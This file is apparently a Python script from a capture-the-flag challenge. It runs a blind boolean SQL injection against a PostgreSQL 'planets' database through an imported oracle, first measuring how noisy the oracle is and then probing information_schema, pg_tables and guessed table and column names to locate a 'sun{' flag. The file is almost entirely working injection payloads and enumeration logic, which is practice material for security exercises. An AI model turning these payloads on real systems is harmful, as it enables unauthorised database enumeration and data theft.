"""Noise direction check + flag localisation battery (retry-on-False)."""
import sys
import time
from oracle import ask

GAP = 2.5


def ask2(expr, tries=2):
    """Spurious answers manifest as False (timeout -> 'no signal'), so any True wins."""
    for i in range(tries):
        if ask(expr):
            return True
        time.sleep(GAP)
    return False


FALSES = [
    ("known-false 'X'='Z'", "(SELECT 'X')='Z'"),
    ("known-false 1=2", "1=2"),
    ("known-false count>9e9", "(SELECT COUNT(*) FROM planets)>9000"),
]
TRUES = [
    ("known-true 1=1", "1=1"),
    ("known-true planets", "(SELECT COUNT(*) FROM planets)>0"),
]

if __name__ == "__main__":
    print("== direction of the noise (5 raw repeats each) ==")
    for name, e in FALSES[:2] + TRUES[:1]:
        rs = []
        for _ in range(5):
            rs.append(ask(e))
            time.sleep(GAP)
        print("  %-22s %s" % (name, rs))

    print("\n== where does the flag live? (retry-on-False) ==")
    LOC = [
        ("flag in planets json", "(SELECT COUNT(*) FROM planets WHERE row_to_json(planets)::text LIKE '%sun{%')>0"),
        ("planets has col flag", "(SELECT COUNT(flag) FROM planets)>0"),
        ("planets has col secret", "(SELECT COUNT(secret) FROM planets)>0"),
        ("col like %flag% exists", "(SELECT COUNT(*) FROM information_schema.columns WHERE column_name LIKE '%flag%')>0"),
        ("col like %secret%", "(SELECT COUNT(*) FROM information_schema.columns WHERE column_name LIKE '%secret%')>0"),
        ("table flags exists", "(SELECT COUNT(*) FROM flags)>=0"),
        ("table secrets exists", "(SELECT COUNT(*) FROM secrets)>=0"),
        ("planets row count >1", "(SELECT COUNT(*) FROM planets)>1"),
        ("planets row count >9", "(SELECT COUNT(*) FROM planets)>9"),
        ("planets row count >20", "(SELECT COUNT(*) FROM planets)>20"),
        ("planets row count >50", "(SELECT COUNT(*) FROM planets)>50"),
        ("cols in planets", "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='planets')>3"),
        ("cols in planets >5", "(SELECT COUNT(*) FROM information_schema.columns WHERE table_name='planets')>5"),
        ("public tables >2", "(SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')>2"),
        ("public tables <2", "(SELECT COUNT(*) FROM pg_tables WHERE schemaname='public')<2"),
    ]
    for name, e in LOC:
        t = time.time()
        r = ask2(e)
        print("  %-24s %-6s (%.1fs)" % (name, r, time.time() - t))
        time.sleep(GAP)
